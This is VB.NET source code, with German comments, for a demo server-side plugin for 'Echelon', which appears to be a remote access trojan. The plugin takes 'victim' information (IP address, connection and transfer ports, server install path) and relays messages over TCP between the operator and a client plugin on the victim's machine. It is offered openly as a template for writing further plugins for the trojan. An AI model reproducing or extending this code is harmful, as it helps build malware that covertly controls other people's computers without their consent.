Imports EchelonPluginInterface.Class1

Public Class Class1
    Implements myInterface


    Const I_AM_CLIENT = &H0
    Const I_AM_SERVER = &H1
    Const I_AM_TOOL = &H2

    Public Shared IsConnected As Boolean
    Shared tcpClient As System.Net.Sockets.TcpClient
    Shared sReader As System.IO.StreamReader
    Shared sWriter As System.IO.StreamWriter
    Shared T As System.Threading.Thread


    '########################################################################################
    Private PlugInType As Integer = I_AM_SERVER 'Angeben, dass es sich um ein Server PlugIn handelt
    Private PlugInName As String = "Krusty´s Echelon PlugIn" 'Name muss mit dem Client PlugIn übereinstimmen
    Private PlugInInformation As String = "Programmiert von Krusty" 'Programmierer oder Version angeben. Diese Angabe ist beim Server PlugIn optional
    Private PlugInBeschreibung As String = "Dieses PlugIn ist nur ein Vorzeige PlugIn." & vbNewLine & _
    "Es soll euch zeigen, wie einfach mal PlugIns Für Echelon Programmieren kann." 'Beschreibung des PlugIns ist beim Server PlugIn optional
    '########################################################################################


    Public Function CloseMe() As Object Implements EchelonPluginInterface.Class1.myInterface.CloseMe
        Return Nothing
    End Function




    Public Function GetConnection(ByVal Tcp_Client As System.Net.Sockets.TcpClient) As Object Implements EchelonPluginInterface.Class1.myInterface.GetConnection
        Try
            tcpClient = Tcp_Client
            sReader = New System.IO.StreamReader(Tcp_Client.GetStream)
            sWriter = New System.IO.StreamWriter(Tcp_Client.GetStream)
            T = New System.Threading.Thread(AddressOf Listen)
            T.IsBackground = True
            T.Start()
            IsConnected = True

            Module1.Verbunden()

            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function

    Public Function GetPlugDescription() As String Implements EchelonPluginInterface.Class1.myInterface.GetPlugDescription
        Return PlugInBeschreibung
    End Function

    Public Function getPlugInInfo() As String Implements EchelonPluginInterface.Class1.myInterface.getPlugInInfo
        Return PlugInInformation
    End Function

    Public Function GetPlugInName() As String Implements EchelonPluginInterface.Class1.myInterface.GetPlugInName
        Return PlugInName
    End Function

    Public Function GetPlugInType() As Integer Implements EchelonPluginInterface.Class1.myInterface.GetPlugInType
        Return PlugInType
    End Function

    Public Function StartMe(ByVal VictimInformations() As String) As Object Implements EchelonPluginInterface.Class1.myInterface.StartMe
        Try
            Server.IpAdresse = VictimInformations(0)
            Server.ConnectionPort = CInt(VictimInformations(1))
            Server.TransferPort = CInt(VictimInformations(2))
            Server.ServerInstallPath = VictimInformations(3)
            Module1.PlugInGestartet()
            Return True
        Catch ex As Exception
            Return False
        End Try
    End Function


    Private Sub Listen()
        Try
            While True
                Dim sMessage As String = sReader.ReadLine.Replace("vbNewline", vbNewLine)
                Module1.NeueNachricht(sMessage)
            End While
        Catch ex As Exception
            Module1.ServerFehler(ex.Message)
        End Try
    End Sub
    Public Shared Sub SendMessageToClientPlugIn(ByVal sMessage As String)
        Try
            sWriter.WriteLine(sMessage.Replace(vbNewLine, "vbnewline"))
            sWriter.Flush()
        Catch ex As Exception
        End Try
    End Sub
    Public Shared Sub CloseConnection()
        On Error Resume Next
        IsConnected = False
        sWriter.Close()
        sReader.Close()
        tcpClient.Close()
        T.Abort()
    End Sub

End Class
Public Class Server
    Public Shared IpAdresse As String
    Public Shared ConnectionPort As Integer
    Public Shared TransferPort As Integer
    Public Shared ServerInstallPath As String
End Class